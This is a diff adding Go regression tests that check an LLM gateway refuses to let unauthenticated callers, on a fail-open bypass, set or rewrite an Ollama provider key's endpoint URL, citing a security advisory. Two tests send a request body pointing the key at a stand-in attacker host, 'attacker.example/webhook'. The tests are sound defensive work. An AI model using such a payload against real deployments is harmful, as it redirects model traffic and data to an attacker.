@@ -415,3 +415,121 @@ func TestCreateProviderKey_CustomBedrockRequiresRegion(t *testing.T) {
 		t.Fatalf("expected bedrock_key_config.region error, got %s", body)
 	}
 }
+
+// TestProviderKeyCarriesEndpointURL locks in exactly which providers are gated by
+// requireGenuineAuthForEndpointChange: those whose key config always carries a
+// caller-chosen dial destination (see GHSA-vj9g-7rqh-x2p4), not providers like Bedrock
+// where the config only selects a region.
+func TestProviderKeyCarriesEndpointURL(t *testing.T) {
+	for _, p := range []schemas.ModelProvider{schemas.Ollama, schemas.SGL, schemas.VLLM, schemas.Azure} {
+		if !providerKeyCarriesEndpointURL(p) {
+			t.Errorf("providerKeyCarriesEndpointURL(%s) = false, want true", p)
+		}
+	}
+	for _, p := range []schemas.ModelProvider{schemas.OpenAI, schemas.Bedrock, schemas.BedrockMantle, schemas.Anthropic} {
+		if providerKeyCarriesEndpointURL(p) {
+			t.Errorf("providerKeyCarriesEndpointURL(%s) = true, want false", p)
+		}
+	}
+}
+
+// TestCreateProviderKey_RejectsEndpointWhenAuthBypassed is the regression test for the
+// PoC in GHSA-vj9g-7rqh-x2p4: an unauthenticated caller (fail-open bypass) must not be
+// able to create an Ollama key pointing at an arbitrary URL - even though a genuinely
+// authenticated admin doing the exact same thing, including pointing it at a private/
+// loopback address, is normal, intended behavior (see the "allowed" test below).
+func TestCreateProviderKey_RejectsEndpointWhenAuthBypassed(t *testing.T) {
+	SetLogger(&mockLogger{})
+	lib.SetLogger(&mockLogger{})
+
+	h := &ProviderHandler{
+		inMemoryStore: &lib.Config{
+			Providers: map[schemas.ModelProvider]configstore.ProviderConfig{
+				"ollama": {},
+			},
+		},
+		modelsManager: &mockModelsManager{},
+	}
+
+	ctx := newTestRequestCtx(`{"weight":1.0,"ollama_key_config":{"url":"https://attacker.example/webhook"}}`)
+	ctx.SetUserValue("provider", "ollama")
+	ctx.SetUserValue(schemas.BifrostContextKeyAuthBypassed, true)
+
+	h.createProviderKey(ctx)
+
+	if ctx.Response.StatusCode() != fasthttp.StatusForbidden {
+		t.Fatalf("status got %d, want 403; body=%s", ctx.Response.StatusCode(), ctx.Response.Body())
+	}
+	if keys := h.inMemoryStore.Providers["ollama"].Keys; len(keys) != 0 {
+		t.Fatalf("expected no key to be persisted, got %d", len(keys))
+	}
+}
+
+// TestRequireGenuineAuthForEndpointChange is the sanity check that the guard is scoped to
+// the fail-open case, not a blanket restriction: a genuinely authenticated caller can still
+// point Ollama/SGL/VLLM/Azure at any address, including a private one - that's the normal,
+// documented self-hosted-Ollama setup - and non-endpoint-carrying providers are never gated.
+func TestRequireGenuineAuthForEndpointChange(t *testing.T) {
+	tests := []struct {
+		name         string
+		provider     schemas.ModelProvider
+		authBypassed bool
+		wantRejected bool
+	}{
+		{"ollama, bypassed, rejected", schemas.Ollama, true, true},
+		{"ollama, genuine auth, allowed", schemas.Ollama, false, false},
+		{"openai has no endpoint field, bypassed but allowed", schemas.OpenAI, true, false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			ctx := newTestRequestCtx("")
+			if tt.authBypassed {
+				ctx.SetUserValue(schemas.BifrostContextKeyAuthBypassed, true)
+			}
+			rejected := requireGenuineAuthForEndpointChange(ctx, tt.provider)
+			if rejected != tt.wantRejected {
+				t.Errorf("requireGenuineAuthForEndpointChange() = %v, want %v", rejected, tt.wantRejected)
+			}
+			if rejected && ctx.Response.StatusCode() != fasthttp.StatusForbidden {
+				t.Errorf("status = %d, want 403", ctx.Response.StatusCode())
+			}
+		})
+	}
+}
+
+// TestUpdateProviderKey_RejectsEndpointWhenAuthBypassed covers the PUT variant of the
+// same PoC - rewriting an EXISTING key's URL, which is what the advisory actually
+// demonstrated.
+func TestUpdateProviderKey_RejectsEndpointWhenAuthBypassed(t *testing.T) {
+	SetLogger(&mockLogger{})
+	lib.SetLogger(&mockLogger{})
+
+	existing := schemas.Key{
+		ID:              "key-1",
+		Weight:          1.0,
+		OllamaKeyConfig: &schemas.OllamaKeyConfig{URL: *schemas.NewSecretVar("http://localhost:11434")},
+	}
+	h := &ProviderHandler{
+		inMemoryStore: &lib.Config{
+			Providers: map[schemas.ModelProvider]configstore.ProviderConfig{
+				"ollama": {Keys: []schemas.Key{existing}},
+			},
+		},
+		modelsManager: &mockModelsManager{},
+	}
+
+	ctx := newTestRequestCtx(`{"weight":1.0,"ollama_key_config":{"url":"https://attacker.example/webhook"}}`)
+	ctx.SetUserValue("provider", "ollama")
+	ctx.SetUserValue("key_id", "key-1")
+	ctx.SetUserValue(schemas.BifrostContextKeyAuthBypassed, true)
+
+	h.updateProviderKey(ctx)
+
+	if ctx.Response.StatusCode() != fasthttp.StatusForbidden {
+		t.Fatalf("status got %d, want 403; body=%s", ctx.Response.StatusCode(), ctx.Response.Body())
+	}
+	storedURL := h.inMemoryStore.Providers["ollama"].Keys[0].OllamaKeyConfig.URL.GetValue()
+	if storedURL != "http://localhost:11434" {
+		t.Fatalf("URL must not have changed, got %q", storedURL)
+	}
+}
